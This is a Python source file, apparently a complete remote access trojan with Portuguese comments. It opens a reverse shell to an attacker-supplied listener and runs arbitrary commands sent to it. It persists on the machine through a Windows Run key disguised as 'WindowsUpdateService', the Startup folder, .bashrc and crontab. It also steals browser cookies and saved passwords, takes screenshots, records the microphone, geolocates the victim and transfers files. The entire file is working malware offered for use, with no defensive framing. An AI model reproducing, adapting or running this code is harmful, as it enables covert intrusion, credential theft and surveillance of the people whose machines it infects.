# language: Python, file: shell.py, target: Cross-platform (Windows, Linux, WSL)
# made by github.com/wrxxnch (Expanded & Fixed)
import os
import sys
import shutil
import socket
import subprocess
import time
import sqlite3
import json
import wave
import urllib.request
from datetime import datetime
from pathlib import Path

# Configurações padrão de conexão
DEFAULT_IP = "127.0.0.1"
DEFAULT_PORT = 4444

CREATE_NO_WINDOW = 0
if os.name == 'nt':
    try:
        CREATE_NO_WINDOW = subprocess.CREATE_NO_WINDOW
    except AttributeError:
        CREATE_NO_WINDOW = 0x08000000

_CACHED_ENDPOINT = None


def get_target_endpoint():
    """Lê IP e Porta via argumento CLI (<ip>:<porta>) ou solicita interativamente apenas uma vez."""
    global _CACHED_ENDPOINT
    if _CACHED_ENDPOINT is not None:
        return _CACHED_ENDPOINT

    target_ip = DEFAULT_IP
    target_port = DEFAULT_PORT

    if len(sys.argv) > 1:
        arg = sys.argv[1]
        if ":" in arg:
            parts = arg.split(":", 1)
            if parts[0].strip():
                target_ip = parts[0].strip()
            if parts[1].strip().isdigit():
                target_port = int(parts[1].strip())
    else:
        try:
            ip_input = input(f"Digite o IP do Host (Listener) [{DEFAULT_IP}]: ").strip()
            if ip_input:
                target_ip = ip_input

            port_input = input(f"Digite a Porta [{DEFAULT_PORT}]: ").strip()
            if port_input.isdigit():
                target_port = int(port_input)
        except Exception:
            pass

    _CACHED_ENDPOINT = (target_ip, target_port)
    return _CACHED_ENDPOINT


def _pack_loot(category, ext, payload, target_ip, target_port):
    """Formata pacote binário para /loot/<categoria>/<ip>_<porta>_<data>_<hora>.<extensao>."""
    now = datetime.now()
    stamp = now.strftime("%Y%m%d_%H%M%S")
    clean_ext = ext.lstrip(".")
    rel_path = f"/loot/{category}/{target_ip}_{target_port}_{stamp}.{clean_ext}"
    path_bytes = rel_path.encode('utf-8')
    return len(path_bytes).to_bytes(4, 'big') + path_bytes + len(payload).to_bytes(8, 'big') + payload


def _dpapi_decrypt(blob):
    """Tenta descriptografar DPAPI no Windows; retorna None se não aplicável."""
    if os.name != 'nt' or not isinstance(blob, (bytes, bytearray)) or not blob:
        return None
    try:
        import ctypes
        from ctypes import wintypes

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [
                ("cbData", wintypes.DWORD),
                ("pbData", ctypes.POINTER(ctypes.c_byte)),
            ]

        in_buf = (ctypes.c_byte * len(blob))(*blob)
        in_blob = DATA_BLOB(len(blob), in_buf)
        out_blob = DATA_BLOB()

        if ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(in_blob), None, None, None, None, 0, ctypes.byref(out_blob)
        ):
            raw = ctypes.string_at(out_blob.pbData, out_blob.cbData)
            ctypes.windll.kernel32.LocalFree(out_blob.pbData)
            return raw.decode('utf-8', errors='replace')
    except Exception:
        pass
    return None


def persist():
    """Identifica o ambiente e aplica a persistência automaticamente."""
    try:
        current_file = os.path.abspath(sys.argv[0])
        target_ip, target_port = get_target_endpoint()
        cli_arg = f"{target_ip}:{target_port}"
        results = []

        is_wsl = False
        if os.name != 'nt':
            try:
                with open("/proc/version", "r") as f:
                    if "microsoft" in f.read().lower():
                        is_wsl = True
            except Exception:
                pass

        if is_wsl:
            try:
                win_profile_cmd = subprocess.run(
                    ["cmd.exe", "/c", "echo %USERPROFILE%"],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
                )
                if win_profile_cmd.returncode == 0 and win_profile_cmd.stdout.strip():
                    raw_win_path = win_profile_cmd.stdout.strip().replace('\r', '')
                    wsl_win_path = subprocess.run(
                        ["wslpath", "-u", raw_win_path],
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
                    ).stdout.strip()

                    if wsl_win_path:
                        startup_folder = os.path.join(
                            wsl_win_path, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
                        )
                        if os.path.exists(startup_folder):
                            file_name = os.path.basename(current_file)
                            destination = os.path.join(startup_folder, file_name)
                            if current_file.lower() != destination.lower():
                                shutil.copyfile(current_file, destination)
                            reg_command = (
                                f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
                                f'/v "WindowsUpdateService" /t REG_SZ /d "python \\"{destination}\\" \\"{cli_arg}\\"" /f'
                            )
                            subprocess.run(["cmd.exe", "/c", reg_command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                            results.append("[+] Persistência no Windows aplicada via WSL!")
            except Exception as wsl_err:
                results.append(f"[-] Aviso WSL->Windows: {str(wsl_err)}")

            home_dir = os.path.expanduser("~")
            bashrc_path = os.path.join(home_dir, ".bashrc")
            python_path = sys.executable
            payload_line = f'\n# Background persistence hook\n{python_path} {current_file} {cli_arg} >/dev/null 2>&1 &\n'
            if os.path.exists(bashrc_path):
                with open(bashrc_path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                if current_file not in content:
                    with open(bashrc_path, "a", encoding="utf-8") as f:
                        f.write(payload_line)
                    results.append("[+] Persistência aplicada no .bashrc do WSL!")

        elif os.name == 'nt':
            appdata = os.environ.get('APPDATA', '')
            if appdata:
                startup_folder = os.path.join(appdata, r"Microsoft\Windows\Start Menu\Programs\Startup")
                file_name = os.path.basename(current_file)
                destination = os.path.join(startup_folder, file_name)
                if current_file.lower() != destination.lower():
                    shutil.copyfile(current_file, destination)
                import winreg
                key = winreg.HKEY_CURRENT_USER
                sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, sub_key, 0, winreg.KEY_SET_VALUE) as reg:
                    winreg.SetValueEx(
                        reg, "WindowsUpdateService", 0, winreg.REG_SZ,
                        f'"{sys.executable}" "{destination}" "{cli_arg}"'
                    )
                results.append("[+] Persistência aplicada no Windows Nativo!")
        else:
            python_path = sys.executable
            cron_command = f"@reboot {python_path} {current_file} {cli_arg} &\n"
            process = subprocess.Popen(["crontab", "-l"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, _ = process.communicate()
            current_cron = stdout.decode('utf-8', errors='ignore')
            if current_file not in current_cron:
                new_cron = current_cron + cron_command
                p_in = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                p_in.communicate(input=new_cron.encode('utf-8'))
                results.append("[+] Persistência aplicada no Linux (Crontab)!")

        return "\n".join(results) + "\n"
    except Exception as e:
        return f"[-] Erro ao aplicar persistência: {str(e)}\n"


def cmd_ls(path="."):
    """Lista arquivos e diretórios detalhadamente."""
    try:
        p = Path(path if path else ".")
        if not p.exists():
            return f"[-] Caminho nao encontrado: {path}\n".encode('utf-8')

        output = []
        for item in p.iterdir():
            mtime = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(item.stat().st_mtime))
            size = item.stat().st_size if item.is_file() else "<DIR>"
            output.append(f"{mtime}\t{str(size):<10}\t{item.name}")
        return ("\n".join(output) + "\n").encode('utf-8', errors='ignore')
    except Exception as e:
        return f"[-] Erro no comando ls: {str(e)}\n".encode('utf-8')


def cmd_screenshot(target_ip, target_port):
    """Captura a tela e envia envelopado para /loot/pictures/<ip>_<porta>_<data>_<hora>.bmp."""
    try:
        temp_path = os.path.join(os.path.expanduser("~"), f"shot_{os.getpid()}.bmp")

        if os.name == 'nt':
            import ctypes
            from ctypes import wintypes

            user32 = ctypes.windll.user32
            gdi32 = ctypes.windll.gdi32

            user32.SetProcessDPIAware()
            width = user32.GetSystemMetrics(0)
            height = user32.GetSystemMetrics(1)

            h_dc = user32.GetDC(0)
            h_mem_dc = gdi32.CreateCompatibleDC(h_dc)
            h_bitmap = gdi32.CreateCompatibleBitmap(h_dc, width, height)
            gdi32.SelectObject(h_mem_dc, h_bitmap)
            gdi32.BitBlt(h_mem_dc, 0, 0, width, height, h_dc, 0, 0, 0x00CC0020 | 0x40000000)

            class BITMAPINFOHEADER(ctypes.Structure):
                _fields_ = [
                    ('biSize', wintypes.DWORD), ('biWidth', wintypes.LONG), ('biHeight', wintypes.LONG),
                    ('biPlanes', wintypes.WORD), ('biBitCount', wintypes.WORD), ('biCompression', wintypes.DWORD),
                    ('biSizeImage', wintypes.DWORD), ('biXPelsPerMeter', wintypes.LONG), ('biYPelsPerMeter', wintypes.LONG),
                    ('biClrUsed', wintypes.DWORD), ('biClrImportant', wintypes.DWORD)
                ]

            bih = BITMAPINFOHEADER()
            bih.biSize = ctypes.sizeof(BITMAPINFOHEADER)
            bih.biWidth = width
            bih.biHeight = -height
            bih.biPlanes = 1
            bih.biBitCount = 24
            bih.biCompression = 0

            buffer_size = width * height * 3
            buffer = ctypes.create_string_buffer(buffer_size)
            gdi32.GetDIBits(h_mem_dc, h_bitmap, 0, height, buffer, ctypes.byref(bih), 0)

            class BITMAPFILEHEADER(ctypes.Structure):
                _fields_ = [
                    ('bfType', wintypes.WORD), ('bfSize', wintypes.DWORD),
                    ('bfReserved1', wintypes.WORD), ('bfReserved2', wintypes.WORD),
                    ('bfOffBits', wintypes.DWORD)
                ]

            bfh = BITMAPFILEHEADER()
            bfh.bfType = 0x4D42
            bfh.bfOffBits = ctypes.sizeof(BITMAPFILEHEADER) + ctypes.sizeof(BITMAPINFOHEADER)
            bfh.bfSize = bfh.bfOffBits + buffer_size

            with open(temp_path, "wb") as f_out:
                f_out.write(bfh)
                f_out.write(bih)
                f_out.write(buffer.raw)

            gdi32.DeleteObject(h_bitmap)
            gdi32.DeleteDC(h_mem_dc)
            user32.ReleaseDC(0, h_dc)
        else:
            for tool in ["scrot", "gnome-screenshot", "import"]:
                if shutil.which(tool):
                    if tool == "scrot":
                        subprocess.run([tool, temp_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    elif tool == "gnome-screenshot":
                        subprocess.run([tool, "-f", temp_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    elif tool == "import":
                        subprocess.run([tool, "-window", "root", temp_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    break

        if os.path.exists(temp_path):
            with open(temp_path, "rb") as f:
                file_data = f.read()
            os.remove(temp_path)
            return _pack_loot("pictures", "bmp", file_data, target_ip, target_port)
        return b"[-] Erro: Falha ao gerar arquivo de screenshot.\n"
    except Exception as e:
        return f"[-] Erro ao capturar screenshot: {str(e)}\n".encode('utf-8')


def _collect_cookies():
    """Coleta cookies de bancos SQLite de navegadores suportados."""
    cookies_data = []
    home = os.path.expanduser("~")
    local_app = os.environ.get("LOCALAPPDATA", os.path.join(home, "AppData", "Local"))

    candidates = [
        ("chrome", os.path.join(local_app, r"Google\Chrome\User Data\Default\Network\Cookies")),
        ("chrome", os.path.join(local_app, r"Google\Chrome\User Data\Default\Cookies")),
        ("edge", os.path.join(local_app, r"Microsoft\Edge\User Data\Default\Network\Cookies")),
        ("brave", os.path.join(local_app, r"BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies")),
        ("chrome_linux", os.path.join(home, ".config/google-chrome/Default/Cookies")),
        ("chromium_linux", os.path.join(home, ".config/chromium/Default/Cookies")),
    ]

    for browser, cookie_file in candidates:
        if not os.path.exists(cookie_file):
            continue
        temp_db = os.path.join(home, f"tmp_ck_{os.getpid()}_{browser}.db")
        try:
            shutil.copy2(cookie_file, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, path, is_secure, is_httponly, encrypted_value FROM cookies")
            for host_key, name, path, is_sec, is_http, enc_val in cursor.fetchall():
                plain = _dpapi_decrypt(enc_val)
                val_repr = plain if plain is not None else (enc_val.hex() if isinstance(enc_val, bytes) else str(enc_val))
                cookies_data.append({
                    "browser": browser,
                    "host": host_key,
                    "name": name,
                    "path": path,
                    "secure": bool(is_sec),
                    "httponly": bool(is_http),
                    "value": val_repr,
                })
            conn.close()
        except Exception:
            pass
        finally:
            if os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except Exception:
                    pass

    return cookies_data


def cmd_download_cookies(target_ip, target_port):
    """Baixa cookies extraídos para /loot/cookies/<ip>_<porta>_<data>_<hora>.json."""
    try:
        data = _collect_cookies()
        payload = json.dumps(data, indent=2, ensure_ascii=False).encode('utf-8')
        return _pack_loot("cookies", "json", payload, target_ip, target_port)
    except Exception as e:
        return f"[-] Erro em download_cookies: {str(e)}\n".encode('utf-8')


def cmd_dump_cookies():
    """Retorna cookies em JSON bruto no stream do shell."""
    try:
        data = _collect_cookies()
        return (json.dumps(data, indent=2, ensure_ascii=False) + "\n").encode('utf-8')
    except Exception as e:
        return f"[-] Erro ao dumpar cookies: {str(e)}\n".encode('utf-8')


def cmd_dump_pass(target_ip, target_port):
    """Extrai credenciais salvas do navegador e envia para /loot/files/<ip>_<porta>_<data>_<hora>.json."""
    creds = []
    home = os.path.expanduser("~")
    local_app = os.environ.get("LOCALAPPDATA", os.path.join(home, "AppData", "Local"))

    login_dbs = [
        ("chrome", os.path.join(local_app, r"Google\Chrome\User Data\Default\Login Data")),
        ("edge", os.path.join(local_app, r"Microsoft\Edge\User Data\Default\Login Data")),
        ("brave", os.path.join(local_app, r"BraveSoftware\Brave-Browser\User Data\Default\Login Data")),
        ("chrome_linux", os.path.join(home, ".config/google-chrome/Default/Login Data")),
        ("chromium_linux", os.path.join(home, ".config/chromium/Default/Login Data")),
    ]

    for browser, db_path in login_dbs:
        if not os.path.exists(db_path):
            continue
        temp_db = os.path.join(home, f"tmp_pw_{os.getpid()}_{browser}.db")
        try:
            shutil.copy2(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, enc_pw in cursor.fetchall():
                plain_pw = _dpapi_decrypt(enc_pw)
                pw_repr = plain_pw if plain_pw is not None else (enc_pw.hex() if isinstance(enc_pw, bytes) else str(enc_pw))
                creds.append({
                    "browser": browser,
                    "url": url,
                    "username": user,
                    "password": pw_repr,
                })
            conn.close()
        except Exception:
            pass
        finally:
            if os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except Exception:
                    pass

    payload = json.dumps(creds, indent=2, ensure_ascii=False).encode('utf-8')
    return _pack_loot("files", "json", payload, target_ip, target_port)


def cmd_geoloc():
    """Obtém coordenadas aproximadas do alvo e gera link do Google Maps."""
    try:
        req = urllib.request.Request(
            "https://ipinfo.io",
            headers={"User-Agent": "Mozilla/5.0"}
        )
        with urllib.request.urlopen(req, timeout=6) as resp:
            info = json.loads(resp.read().decode('utf-8', errors='replace'))

        if info.get("status") != "success":
            return f"[-] Falha na geolocalizacao: {info.get('message', 'erro desconhecido')}\n".encode('utf-8')

        lat = info.get("lat")
        lon = info.get("lon")
        maps_url = f"https://www.google.com/maps?q={lat},{lon}"
        result = (
            f"[+] IP: {info.get('query')}\n"
            f"[+] Local: {info.get('city')}, {info.get('regionName')}, {info.get('country')}\n"
            f"[+] ISP: {info.get('isp')}\n"
            f"[+] Coordenadas: {lat}, {lon}\n"
            f"[+] Google Maps: {maps_url}\n"
        )
        return result.encode('utf-8', errors='ignore')
    except Exception as e:
        return f"[-] Erro no geoloc: {str(e)}\n".encode('utf-8')


def cmd_record_mic(arg, target_ip, target_port):
    """Grava áudio do microfone por N segundos (padrão 5s) e envia para /loot/audio/<ip>_<porta>_<data>_<hora>.wav."""
    try:
        seconds = int(arg.strip()) if arg and arg.strip().isdigit() else 5
        seconds = max(1, min(seconds, 60))
        sample_rate = 16000
        channels = 1
        temp_wav = os.path.join(os.path.expanduser("~"), f"mic_{os.getpid()}.wav")

        recorded = False
        try:
            import sounddevice as sd
            audio_data = sd.rec(int(seconds * sample_rate), samplerate=sample_rate, channels=channels, dtype='int16')
            sd.wait()
            with wave.open(temp_wav, "wb") as wf:
                wf.setnchannels(channels)
                wf.setsampwidth(2)
                wf.setframerate(sample_rate)
                wf.writeframes(audio_data.tobytes())
            recorded = True
        except Exception:
            pass

        if not recorded and shutil.which("arecord"):
            subprocess.run(
                ["arecord", "-q", "-d", str(seconds), "-f", "S16_LE", "-r", str(sample_rate), "-c", str(channels), temp_wav],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=seconds + 5
            )
            recorded = os.path.exists(temp_wav) and os.path.getsize(temp_wav) > 0

        if not recorded and shutil.which("ffmpeg"):
            inp = ["-f", "dshow", "-i", "audio=Microphone"] if os.name == 'nt' else ["-f", "alsa", "-i", "default"]
            subprocess.run(
                ["ffmpeg", "-y", "-loglevel", "quiet", *inp, "-t", str(seconds), "-ac", str(channels), "-ar", str(sample_rate), temp_wav],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=seconds + 5
            )
            recorded = os.path.exists(temp_wav) and os.path.getsize(temp_wav) > 0

        if not recorded or not os.path.exists(temp_wav):
            return b"[-] Erro: Nenhum backend de audio disponivel (sounddevice, arecord ou ffmpeg).\n"

        with open(temp_wav, "rb") as f:
            wav_bytes = f.read()
        try:
            os.remove(temp_wav)
        except Exception:
            pass

        return _pack_loot("audio", "wav", wav_bytes, target_ip, target_port)
    except Exception as e:
        return f"[-] Erro no record_mic: {str(e)}\n".encode('utf-8')


def cmd_download(filepath, target_ip, target_port):
    """Lê um arquivo do alvo e envia envelopado para /loot/files/<ip>_<porta>_<data>_<hora>.<extensao>."""
    try:
        if not filepath or not os.path.exists(filepath):
            return b"[-] Arquivo nao encontrado.\n"
        with open(filepath, "rb") as f:
            data = f.read()
        ext = Path(filepath).suffix.lstrip(".") or "bin"
        return _pack_loot("files", ext, data, target_ip, target_port)
    except Exception as e:
        return f"[-] Erro no download: {str(e)}\n".encode('utf-8')


def cmd_upload(filepath, file_data):
    """Salva um arquivo enviado pelo host no alvo."""
    try:
        with open(filepath, "wb") as f:
            f.write(file_data)
        return b"[+] Upload realizado com sucesso.\n"
    except Exception as e:
        return f"[-] Erro no upload: {str(e)}\n".encode('utf-8')


def get_help():
    help_menu = """
=============================================
         COMANDOS DISPONIVEIS (SHELL)
=============================================
 help               - Exibe este menu de ajuda
 ls [caminho]       - Lista o diretorio atual ou especificado
 screenshot         - Captura tela para /loot/pictures/<ip>_<porta>_<data>_<hora>.bmp
 download_cookies   - Baixa cookies para /loot/cookies/<ip>_<porta>_<data>_<hora>.json
 dump_cookies       - Exibe cookies no terminal
 dump_pass          - Extrai senhas salvas para /loot/files/<ip>_<porta>_<data>_<hora>.json
 geoloc             - Retorna coordenadas e link do Google Maps
 record_mic [seg]   - Grava microfone para /loot/audio/<ip>_<porta>_<data>_<hora>.wav
 download <arq>     - Baixa arquivo para /loot/files/<ip>_<porta>_<data>_<hora>.<ext>
 upload <arq>       - Envia um arquivo para o alvo
 exit               - Encerra a sessao atual
=============================================
"""
    return help_menu.encode('utf-8', errors='ignore')


def reverse_shell():
    persist()
    target_ip, target_port = get_target_endpoint()

    while True:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))

            while True:
                data = s.recv(1024)
                if not data:
                    break

                command = data.decode('utf-8', errors='ignore').strip()
                parts = command.split(" ", 1)
                cmd_name = parts[0].lower()
                cmd_arg = parts[1] if len(parts) > 1 else ""

                output = b""
                try:
                    if cmd_name == 'exit':
                        s.send(b"Sessao encerrada.\n")
                        break
                    elif cmd_name == 'help':
                        output = get_help()
                    elif cmd_name == 'ls':
                        output = cmd_ls(cmd_arg)
                    elif cmd_name == 'screenshot':
                        output = cmd_screenshot(target_ip, target_port)
                    elif cmd_name == 'download_cookies':
                        output = cmd_download_cookies(target_ip, target_port)
                    elif cmd_name == 'dump_cookies':
                        output = cmd_dump_cookies()
                    elif cmd_name == 'dump_pass':
                        output = cmd_dump_pass(target_ip, target_port)
                    elif cmd_name == 'geoloc':
                        output = cmd_geoloc()
                    elif cmd_name == 'record_mic':
                        output = cmd_record_mic(cmd_arg, target_ip, target_port)
                    elif cmd_name == 'download':
                        output = cmd_download(cmd_arg, target_ip, target_port)
                    else:
                        kwargs = {}
                        if CREATE_NO_WINDOW:
                            kwargs['creationflags'] = CREATE_NO_WINDOW

                        proc = subprocess.Popen(
                            command,
                            shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE,
                            **kwargs
                        )
                        output = proc.stdout.read() + proc.stderr.read()
                        if not output:
                            output = b"[+] Comando executado sem retorno.\n"
                except Exception as ex:
                    output = f"[-] Erro ao processar comando: {str(ex)}\n".encode('utf-8', errors='ignore')

                s.send(output)
        except Exception:
            time.sleep(5)
        finally:
            if s:
                try:
                    s.close()
                except Exception:
                    pass


if __name__ == "__main__":
    reverse_shell()
